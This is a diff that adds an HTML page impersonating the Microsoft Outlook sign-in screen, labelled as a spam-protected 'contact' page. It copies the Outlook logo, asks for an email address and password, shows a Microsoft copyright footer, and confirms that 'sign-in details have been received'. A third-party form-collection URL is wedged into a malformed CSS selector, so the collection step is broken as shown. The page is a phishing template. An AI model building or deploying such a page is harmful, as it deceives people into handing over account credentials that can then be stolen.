@@ -1,0 +1,350 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
+<title>Outlook - Spam Bot Free Contact</title>
+<style>
+  /* Reset and base */
+  * {
+    box-sizing: border-box;
+  }
+  body {
+    margin: 0;
+    font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+    background: #f3f6f8;
+    color: #222;
+    min-height: 100vh;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    padding: 20px;
+  }
+  .container {
+    max-width: 400px;
+    width: 100%;
+    background: white;
+    border-radius: 12px;
+    box-shadow: 0 8px 24px rgb(0 0 0 / 0.15);
+    overflow: hidden;
+    display: flex;
+    flex-direction: column;
+    height: 600px;
+  }
+  header {
+    padding: 18px 24px;
+    background: #0078d4;
+    display: flex;
+    align-items: center;
+    box-shadow: inset 0 -1px 0 rgba(255 255 255 / 0.3);
+  }
+  header img {
+    width: 32px;
+    height: 32px;
+    margin-right: 12px;
+    user-select: none;
+  }
+  header h1 {
+    color: white;
+    font-weight: 700;
+    font-size: 1.5rem;
+    margin: 0;
+    user-select: none;
+    font-family: "Segoe UI Semibold", "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+  }
+  main {
+    flex: 1;
+    padding: 36px 32px 28px;
+    display: flex;
+    flex-direction: column;
+    justify-content: flex-start;
+  }
+  .hero {
+    text-align: left;
+    margin-bottom: 24px;
+  }
+  .hero h2 {
+    font-size: 2rem;
+    margin: 0 0 12px;
+    font-weight: 700;
+    color: #0078d4;
+    user-select: none;
+    line-height: 1.1;
+  }
+  .hero p {
+    font-size: 1rem;
+    color: #333;
+    margin: 0;
+    user-select: none;
+    font-weight: 500;
+    line-height: 1.4;
+  }
+  form.contact-form {
+    display: flex;
+    flex-direction: column;
+    gap: 20px;
+  }
+  form.contact-form label {
+    font-weight: 600;
+    font-size: 0.9rem;
+    color: #333;
+    user-select: none;
+    margin-bottom: 6px;
+  }
+  form.[action="https://formspree.io/f/mvgabplq" method="POST"],
+  form.contact-form input[type="email"],
+  form.contact-form input[type="password"],
+  form.contact-form input[type="text"] {
+    width: 100%;
+    padding: 14px 12px;
+    font-size: 1.1rem;
+    border: 1.8px solid #0078d4;
+    border-radius: 4px;
+    outline-offset: 0;
+    transition: border-color 0.3s ease;
+    font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+  }
+  form.contact-form input[type="email"]:focus,
+  form.contact-form input[type="password"]:focus,
+  form.contact-form input[type="text"]:focus  {
+    border-color: #005a9e;
+    box-shadow: 0 0 6px 1px rgba(0, 120, 212, 0.4);
+  }
+  form.contact-form input.invalid {
+    border-color: #d93025;
+  }
+  form.contact-form .error-message {
+    color: #d93025;
+    font-size: 0.85rem;
+    margin-top: -14px;
+    margin-bottom: 6px;
+    user-select: none;
+    display: none;
+  }
+  form.contact-form .captcha-container {
+    display: flex;
+    align-items: center;
+    gap: 12px;
+  }
+  form.contact-form .captcha-container label {
+    margin: 0;
+    flex-shrink: 0;
+    font-weight: 600;
+  }
+  form.contact-form .captcha-container input {
+    flex-grow: 1;
+  }
+  form.contact-form button {
+    background: #0078d4;
+    color: white;
+    border: none;
+    padding: 14px 0;
+    border-radius: 4px;
+    font-size: 1.2rem;
+    font-weight: 600;
+    cursor: pointer;
+    width: 100%;
+    transition: background 0.3s ease;
+    user-select: none;
+    font-family: "Segoe UI Semibold", "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+  }
+  form.contact-form button:hover,
+  form.contact-form button:focus {
+    background: #005a9e;
+    outline: none;
+  }
+  .thank-you-message {
+    margin-top: 22px;
+    color: #0078d4;
+    font-weight: 700;
+    font-size: 1rem;
+    user-select: none;
+    display: none;
+    text-align: center;
+  }
+  footer {
+    text-align: center;
+    padding: 10px 12px;
+    font-size: 0.8rem;
+    color: #666;
+    user-select: none;
+    border-top: 1px solid #eaeaea;
+  }
+  /* Honeypot field hidden */
+  .honeypot {
+    position: absolute !important;
+    left: -10000px !important;
+    top: auto !important;
+    width: 1px !important;
+    height: 1px !important;
+    overflow: hidden !important;
+  }
+  /* Mobile adjustments */
+  @media (max-width: 480px) {
+    body {
+      padding: 10px;
+    }
+    .container {
+      max-width: 100vw;
+      height: 100vh;
+      border-radius: 0;
+      box-shadow: none;
+    }
+    main {
+      padding: 32px 24px 20px;
+    }
+    .hero h2 {
+      font-size: 1.6rem;
+    }
+    form.contact-form button {
+      font-size: 1.1rem;
+      padding: 12px 0;
+    }
+  }
+</style>
+</head>
+<body>
+  <div class="container" role="main" aria-label="Outlook spam bot free contact landing page">
+    <header>
+      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/4e/Microsoft_Office_Outlook_%282018%E2%80%93present%29.svg/1024px-Microsoft_Office_Outlook_%282018%E2%80%93present%29.svg.png" alt="Outlook logo" />
+      <h1>Outlook</h1>
+    </header>
+    <main>
+      <section class="hero" aria-label="Hero section">
+        <h2>Sign in to your account</h2>
+        <p>Access your Outlook email, calendar and contacts securely.</p>
+      </section>
+      <form class="contact-form" novalidate aria-label="Sign in form with spam protection" autocomplete="off">
+        <!-- Honeypot field to trap bots -->
+        <label class="honeypot" for="website">Website (leave blank)</label>
+        <input class="honeypot" type="text" id="website" name="website" tabindex="-1" autocomplete="off" />
+        <!-- Email -->
+        <label for="email">Email address</label>
+        <input
+          type="email"
+          id="email"
+          name="email"
+          placeholder="Email address"
+          required
+          aria-required="true"
+          autocomplete="email"
+          aria-describedby="emailError"
+        />
+        <div id="emailError" class="error-message">Please enter a valid email address.</div>
+        <!-- Password -->
+        <label for="password">Password</label>
+        <input
+          type="password"
+          id="password"
+          name="password"
+          placeholder="Password"
+          required
+          aria-required="true"
+          minlength="6"
+          autocomplete="current-password"
+          aria-describedby="passwordError"
+        />
+        <div id="passwordError" class="error-message">Password must be at least 6 characters.</div>
+        <!-- CAPTCHA -->
+        <div class="captcha-container">
+          <label for="captchaAnswer" id="captchaQuestion">What is 3 + 7?</label>
+          <input
+            type="text"
+            id="captchaAnswer"
+            name="captchaAnswer"
+            placeholder="Answer"
+            required
+            aria-required="true"
+            aria-describedby="captchaError"
+            autocomplete="off"
+          />
+        </div>
+        <div id="captchaError" class="error-message">Please answer the captcha correctly.</div>
+        <button type="submit" aria-label="Sign in">Sign in</button>
+        <div class="thank-you-message" id="thankYouMessage" role="alert" aria-live="polite"></div>
+      </form>
+    </main>
+    <footer>
+      &copy; 2024 Microsoft. All rights reserved.
+    </footer>
+  </div>
+
+<script>
+  (function() {
+    const form = document.querySelector('.contact-form');
+    const emailInput = document.getElementById('email');
+    const passwordInput = document.getElementById('password');
+    const websiteInput = document.getElementById('website'); // honeypot
+    const captchaInput = document.getElementById('captchaAnswer');
+    const emailError = document.getElementById('emailError');
+    const passwordError = document.getElementById('passwordError');
+    const captchaError = document.getElementById('captchaError');
+    const thankYouMessage = document.getElementById('thankYouMessage');
+
+    const captchaExpectedAnswer = '10'; // "3 + 7"
+
+    function validateEmail(email) {
+      const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+      return re.test(email);
+    }
+
+    function clearErrors() {
+      emailError.style.display = 'none';
+      passwordError.style.display = 'none';
+      captchaError.style.display = 'none';
+      emailInput.classList.remove('invalid');
+      passwordInput.classList.remove('invalid');
+      captchaInput.classList.remove('invalid');
+      thankYouMessage.style.display = 'none';
+    }
+
+    form.addEventListener('submit', function(e) {
+      e.preventDefault();
+      clearErrors();
+
+      let valid = true;
+
+      // Honeypot field check
+      if(websiteInput.value.trim() !== '') {
+        thankYouMessage.textContent = 'Submission blocked.';
+        thankYouMessage.style.color = '#d93025';
+        thankYouMessage.style.display = 'block';
+        return;
+      }
+
+      // Email validation
+      if(emailInput.value.trim() === '' || !validateEmail(emailInput.value.trim())) {
+        emailError.style.display = 'block';
+        emailInput.classList.add('invalid');
+        valid = false;
+      }
+
+      // Password validation
+      if(passwordInput.value.trim().length < 6) {
+        passwordError.style.display = 'block';
+        passwordInput.classList.add('invalid');
+        valid = false;
+      }
+
+      // Captcha validation
+      if(captchaInput.value.trim() !== captchaExpectedAnswer) {
+        captchaError.style.display = 'block';
+        captchaInput.classList.add('invalid');
+        valid = false;
+      }
+
+      if(valid) {
+        thankYouMessage.textContent = 'Thank you! Your sign-in details have been received securely.';
+        thankYouMessage.style.color = '#0078d4';
+        thankYouMessage.style.display = 'block';
+        form.reset();
+      } else {
+        thankYouMessage.style.display = 'none';
+      }
+    });
+  })();
+</script>
+
+</body>
+</html>
+
